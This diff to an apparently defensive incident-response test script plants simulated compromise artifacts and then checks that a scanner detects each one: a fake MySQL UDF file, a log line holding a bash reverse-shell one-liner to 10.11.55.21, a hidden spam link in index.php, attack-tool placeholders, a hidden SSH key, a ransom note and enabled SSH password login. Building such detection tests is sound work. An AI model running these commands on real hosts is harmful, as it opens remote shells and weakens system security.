@@ -64,6 +64,16 @@ printf 'YOUR FILES HAVE BEEN ENCRYPTED\nSend 0.5 BTC\n' > /root/README_DECRYPT_F
 printf 'secret\n' > /root/victim.docx.locked
 grep -q "^Port " /etc/ssh/sshd_config 2>/dev/null || true
 grep -q "^PasswordAuthentication" /etc/ssh/sshd_config 2>/dev/null || echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config 2>/dev/null
+# --- R14: UDF提权 / error.log反弹shell / 黑链 / 攻击工具 / 点开头隐藏公钥 ---
+mkdir -p /usr/lib/mysql/plugin
+printf 'UDF payload' > /usr/lib/mysql/plugin/udf.so
+printf '220101 10:00:00 mysqld_safe sh -c "bash -i >&/dev/tcp/10.11.55.21/3333 0>&1"\n' > /var/log/mysqld.log
+printf '<div style="display:none"><a href="http://evil-blink.example.com/bet">bet</a></div>\n' > /var/www/html/index.php
+mkdir -p /opt
+printf 'fscan binary' > /opt/fscan_amd64
+printf '[common]\nserver_addr = 10.11.55.21\nserver_port = 7000\n' > /tmp/frpc.ini
+mkdir -p /root/.ssh
+printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKE ctfir-marker@kali\n' > /root/.ssh/.id_rsa.pub
 echo INSTALL_DONE
 FIXEOF
 
@@ -87,6 +97,8 @@ rm -rf /var/www/html/.git
 rm -f /etc/pam.d/ctfir-marker-pam /etc/profile.d/ctfir-marker-umask.sh \
       /root/README_DECRYPT_FILES.html /root/victim.docx.locked
 sed -i '/^PasswordAuthentication yes$/d' /etc/ssh/sshd_config 2>/dev/null || true
+rm -f /usr/lib/mysql/plugin/udf.so /var/log/mysqld.log /opt/fscan_amd64 /tmp/frpc.ini /root/.ssh/.id_rsa.pub
+rm -f /var/www/html/index.php
 [ -f /usr/bin/ls.ctfir-bak ] && mv -f /usr/bin/ls.ctfir-bak /usr/bin/ls
 # argv[0] 伪装使 pgrep -f 失效，改用 exe 符号链接定位（检测同款思路）
 for pd in /proc/[0-9]*; do
@@ -172,6 +184,13 @@ a "LNX.BASE.FAILLOCK.001"       "失败锁定缺失命中"       "faillock 漏�
 a "LNX.RANSOM.TRACE.001"        "勒索痕迹命中"           "勒索漏检"
 a "LNX.SSH.PWDAUTH.001"         "sshd 口令登录命中"      "sshd PWDAUTH 漏检"
 a "LNX.BASE.TMOUT.001"          "TMOUT 缺失命中"         "TMOUT 漏检"
+echo "--- v0.5-R14 UDF/errlog/黑链/工具/点key ---"
+a "MID.MYSQL.UDF.001"           "UDF 提权命中"           "UDF 漏检"
+a "MID.MYSQL.ERRSHELL.001"      "error.log 反弹shell命中" "errlog 漏检"
+a "LNX.WEB.BLACKLINK.001"       "黑链命中"               "黑链漏检"
+a "LNX.TOOLS.ARTIFACT.001"      "fscan 工具命中"         "工具文件漏检"
+a "LNX.TOOLS.FRPCFG.001"        "frpc 配置命中"          "frpc 漏检"
+a "LNX.SSH.HIDDENKEY.001"       "点开头公钥命中"         "隐藏 key 漏检"
 grep -q "ADVICE" "$RESF" && ok "建议挂接" || bad "建议缺失"
 
 echo "=== 阶段4：清理并复验 ==="
